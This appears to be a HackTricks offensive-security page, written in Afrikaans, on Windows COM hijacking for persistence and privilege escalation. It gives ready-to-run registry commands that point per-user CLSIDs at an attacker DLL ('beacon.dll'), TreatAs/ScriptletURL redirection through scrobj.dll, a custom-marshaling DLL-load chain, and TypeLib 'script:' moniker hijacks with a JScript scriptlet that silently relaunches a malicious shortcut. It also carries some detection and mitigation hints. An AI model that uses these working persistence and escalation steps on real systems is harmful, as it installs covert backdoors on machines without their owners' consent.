# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Soek na nie-bestaande COM-komponente

Omdat gebruikers die waardes van HKCU kan wysig, kan **COM Hijacking** as ’n **persistence mechanism** gebruik word. Met `procmon` is dit maklik om na COM-registersleutels te soek wat nog nie bestaan nie en deur ’n aanvaller geskep kan word. Klassieke filters:

- **RegOpenKey**-bewerkings.
- waar die _Result_ **NAME NOT FOUND** is.
- en die _Path_ met **InprocServer32** eindig.

Nuttige variasies tydens opsporing:

- Soek ook na ontbrekende **`LocalServer32`**-sleutels. Sommige COM-klasse is buiteprosesbedieners en sal ’n EXE wat deur ’n aanvaller beheer word, eerder as ’n DLL begin.
- Soek na **`TreatAs`**- en **`ScriptletURL`**-registerbewerkings benewens `InprocServer32`. Onlangse opsporingsinhoud en skrywes oor malware vestig telkens die aandag hierop, omdat dit baie skaarser as normale COM-registrasies is en daarom ’n sterk aanduiding is.
- Kopieer die wettige **`ThreadingModel`** vanaf die oorspronklike `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wanneer jy ’n registrasie na HKCU kloon. Die gebruik van die verkeerde model laat aktivering dikwels misluk en maak die hijack opvallend.<sup>[[3]](#references)</sup>
- Inspekteer op 64-bis-stelsels beide die 64-bis- en 32-bis-aansigte (`procmon.exe` teenoor `procmon64.exe`, `HKLM\Software\Classes` en `HKLM\Software\Classes\WOW6432Node`), omdat 32-bis-toepassings moontlik ’n ander COM-registrasie vind.

Sodra jy besluit het watter nie-bestaande COM jy wil naboots, voer die volgende opdragte uit. _Wees versigtig as jy besluit om ’n COM na te boots wat elke paar sekondes gelaai word, want dit kan oordrewe wees._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackable Task Scheduler COM components

Windows Tasks gebruik Custom Triggers om COM-objects aan te roep, en omdat hulle deur die Task Scheduler uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

As jy die uitvoer nagaan, kan jy byvoorbeeld een kies wat **elke keer wanneer ’n gebruiker aanmeld** uitgevoer gaan word.

As jy nou vir die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID**, en in HKLM en HKCU soek, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Dan kan jy eenvoudig die HKCU-inskrywing skep, en elke keer wanneer die gebruiker aanmeld, sal jou backdoor uitgevoer word.

## Hangende COM-registrasies en Custom Marshaling

’n Masjienwye COM-registrasie kan ’n DLL-planting-primitief word sonder dat die register verander word. Soek na ’n `InprocServer32`-waarde waarvan die DLL ontbreek en waarvan die finale pad deur ’n gebruiker met lae voorregte geskep of gewysig kan word. As jy ’n DLL met presies dieselfde naam plaas, sal enige proses wat die CLSID aktiveer, aanvallerskode laai. In die CrossDevice-voorbeeld was die geregistreerde pad `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, dus kon ’n standaardgebruiker die ontbrekende subgids en DLL skep.<sup>[[5]](#references)</sup>

### `IMarshal` as ’n DLL-laaiprimitive tussen prosesse

COM stel ’n koppelvlakwyser normaalweg voor met ’n standaard `OBJREF` wat die ontvanger na die oorspronklike objek verwys. ’n Objek wat `IMarshal` implementeer, kan eerder ’n pasgemaakte `OBJREF` lewer. Sy `GetUnmarshalClass`-metode verskaf die CLSID van die kode wat die objek in die ontvangende proses sal herbou. Daardie CLSID hoef nie na die oorspronklike objek te verwys nie. COM hanteer dit as ’n in-prosesbediener en laai die geregistreerde DLL voordat dit die aangevraagde koppelvlakmetode aanroep.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

’n Minimale kwaadwillige implementering hoef net die hangende CLSID in `GetUnmarshalClass` te vervang.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Stuur hierdie object deur ’n proxied metodeparameter soos ’n `[in] IUnknown *`. Nog ’n opsie is `CoGetInstanceFromIStorage`, waar die custom-marshaled object ook genoeg van `IStorage` implementeer om die plaaslike kontroles te slaag. Outomatiese unmarshaling op die remote server los die vervangde CLSID op, dus word die DLL gelaai voordat die teikenmetode loop.<sup>[[5]](#references)</sup>

Die primitive is nie beperk tot ontbrekende registrasies nie. Dit kan ook die ontvanger dwing om ’n bestaande custom-unmarshaler-DLL te laai en foute in die laai- of unmarshaling-pad daarvan blootlê.<sup>[[5]](#references)</sup>

Die ketting vereis al die volgende voorwaardes:<sup>[[5]](#references)</sup>

1. ’n Masjienwye CLSID verwys na ’n ontbrekende of vervangbare in-process DLL.
2. Die aanvaller kan daardie DLL by die opgeloste pad plaas.
3. ’n Aktiveerbare out-of-process COM-server loop met die verlangde voorregvlak.
4. Die server aanvaar custom marshaling en stel ’n proxied oproep beskikbaar wat die aanvaller se object oor die prosesgrens dra.

### Vind losstaande in-process servers

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) en [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) kan die masjienwye COM-databasis opnoem en elke server deur normale Win32-module-oplossing toets. Dit is verkieslik bo `Test-Path`, omdat sommige registrasies slegs ’n lêernaam bevat en op die loader-soekpad staatmaak.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Behandel die resultaat as ’n kandidaatlys, nie as bewys van uitbuitbaarheid nie. Los die pad op soos die loader dit doen, en inspekteer dan die DACL op die eerste bestaande ouergids en op die beoogde DLL as dit reeds bestaan. ’n Ontbrekende lêer is slegs nuttig as die aanvaller die pad kan skep of vervang wat COM werklik sal oplos.<sup>[[5]](#references)</sup>

### Kies en begin ’n bevoorregte ontvanger

Inspekteer kandidaat-COM-klasse vir `RunAs`, diensassosiasie, beskikbare koppelvlakke en RPC-proxies. ’n Klas wat vir `SYSTEM` opgestel is, maar nie deur ’n benoemde diens gerugsteun word nie, kan dalk nie direk geaktiveer word nie omdat RPCSS dit nie kan begin nie. Soek in daardie geval ’n onbevoorregte sneller wat sy gasheer begin, soos ’n uitvoerbare geskeduleerde taak, en herhaal enige vereiste benoemde gebeurtenis of IPC-voorvereiste wat die bediener aan die gang hou.<sup>[[5]](#references)</sup>

Byvoorbeeld, die kwesbare Shell Create Object Handler-ketting het sy gasheer begin deur die verwagte globale gebeurtenis te skep voordat ’n geskeduleerde taak wat deur ’n gebruiker uitgevoer kon word, aangeroep is.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Koppel die resulterende objekverwysing terug aan sy gasheer en verifieer beide identiteit en marshaling-beleid. Lys daarna die koppelvlakke en skakel hul proxies na IDL om, sodat jy ’n invoerparameter soos `IUnknown *` kan vind wat die vals objek sal marshal.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Beskerming teen custom marshaling

’n Geskikte ontvanger moet nie onbetroubare custom marshalers verwerp nie. Twee proseswye beskermings is `EOAC_NO_CUSTOM_MARSHAL` in die vermoëns wat aan `CoInitializeSecurity` deurgegee word, en `COMGLB_UNMARSHALING_POLICY_STRONG` wat deur `IGlobalOptions::Set` gestel word. Met symbols kan die ooreenstemmende toestand in `combase!gCapabilities` en `combase!g_GLBOPT_UnmarshalingPolicy` nagegaan word; NtObjectManager stel die resultaat as `CustomMarshalAllowed` beskikbaar waar sy prosesontleder die Windows-bou ondersteun.<sup>[[5]](#references)</sup>

---

## COM TreatAs-kaping + ScriptletURL

`TreatAs` laat toe dat een CLSID deur ’n ander nageboots word.<sup>[[4]](#references)</sup> Vanuit ’n offensiewe perspektief beteken dit dat jy die oorspronklike CLSID ongewysig kan laat, ’n tweede CLSID per gebruiker kan skep wat na `scrobj.dll` wys, en dan die werklike COM-objek na die kwaadwillige een kan herlei met `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Dit is nuttig wanneer:

- die teikentoepassing reeds ’n stabiele CLSID by aanmelding of wanneer die toepassing begin, instansieer
- jy ’n herleiding wat net die registry raak wil hê, eerder as om die oorspronklike `InprocServer32` te vervang
- jy ’n plaaslike of afgeleë `.sct`-scriptlet deur die `ScriptletURL`-waarde wil uitvoer

Voorbeeldwerkvloei (aangepas uit openbare Atomic Red Team-tegnieke en ouer navorsing oor COM-registry-misbruik):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notas:

- `scrobj.dll` lees die `ScriptletURL`-waarde en voer die verwysde `.sct` uit, sodat jy die payload as ’n plaaslike lêer kan hou of dit op afstand oor HTTP/HTTPS kan aflaai.
- `TreatAs` is veral handig wanneer die oorspronklike COM-registrasie in HKLM volledig en stabiel is, omdat jy dan net ’n klein herleiding per gebruiker nodig het in plaas daarvan om die hele boom te weerspieël.
- Om dit te valideer sonder om vir die natuurlike sneller te wag, kan jy die vals ProgID/CLSID handmatig instansieer met `rundll32.exe -sta <ProgID-or-CLSID>` as die teikenk klas STA-aktivering ondersteun.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieer COM-koppelvlakke en word via `LoadTypeLib()` gelaai. Wanneer ’n COM-bediener geïnstantieer word, kan die bedryfstelsel ook die geassosieerde TypeLib laai deur register-sleutels onder `HKCR\TypeLib\{LIBID}` te raadpleeg. As die TypeLib-pad met ’n **moniker** vervang word, bv. `script:C:\...\evil.sct`, sal Windows die scriptlet uitvoer wanneer die TypeLib opgelos word – wat ’n sluipende persistence oplewer wat aktiveer wanneer algemene komponente gebruik word.

Dit is waargeneem teen die Microsoft Web Browser-beheer (wat gereeld deur Internet Explorer, programme wat WebBrowser insluit, en selfs `explorer.exe` gelaai word).<sup>[[1]](#references)[[2]](#references)</sup>

### Stappe (PowerShell)

1) Identifiseer die TypeLib (LIBID) wat deur ’n CLSID met ’n hoë gebruiksfrekwensie gebruik word. Voorbeeld van ’n CLSID wat dikwels deur malware-kettings misbruik word: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Wys die per-gebruiker TypeLib-pad na ’n plaaslike scriptlet met die `script:` moniker (geen administrateurregte word vereis nie):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Plaas ’n minimale JScript `.sct` wat jou primêre payload herbegin (bv. ’n `.lnk` wat in die aanvanklike ketting gebruik word):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Triggering – die opening van IE, ’n toepassing wat die WebBrowser-beheer insluit, of selfs gewone Explorer-aktiwiteit sal die TypeLib laai en die scriptlet uitvoer, wat jou ketting tydens aanmelding/herlaai heraktiveer.

Opruiming
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notas
- Jy kan dieselfde logika op ander COM-komponente met hoë frekwensie toepas; los altyd eers die werklike `LIBID` op vanaf `HKCR\CLSID\{CLSID}\TypeLib`.
- Op 64-bis-stelsels kan jy ook die `win64`-subsleutel invul vir 64-bis-verbruikers.

## References

- [1] [Kaping van die TypeLib – Nuwe COM-persistensietegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde uitvissingaanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Hersiening van COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID-sleutel (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows-uitbuitingstegnieke: Wees-COM-objekregistrasies](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal-koppelvlak](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

